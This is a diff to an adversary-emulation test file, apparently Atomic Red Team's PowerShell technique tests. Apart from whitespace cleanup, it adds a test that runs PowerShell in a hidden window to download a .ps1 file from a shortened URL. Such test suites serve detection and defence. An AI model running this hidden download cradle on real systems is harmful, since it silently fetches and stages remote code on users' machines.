@@ -230,7 +230,7 @@ atomic_tests:
   description: |
     Connect to a remote powershell session and interact with the host.
     Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
-  
+
   supported_platforms:
     - windows
 
@@ -247,7 +247,7 @@ atomic_tests:
       Try {
           New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null
           exit 0
-      } 
+      }
       Catch {
           exit 1
       }
@@ -375,3 +375,15 @@ atomic_tests:
   executor:
     command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
     name: powershell
+- name: Download Cradle with a hidden window
+  auto_generated_guid: e1ab88c7-57b2-4e9e-a683-bec1cbed2ad6
+  description: |
+    Download Cradle with a hidden window
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      powershell.exe -WindowStyle hidden -c "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path_2.ps1')"
+    cleanup_command: |
+      del /f Default_File_Path_2.ps1
+    name: command_prompt
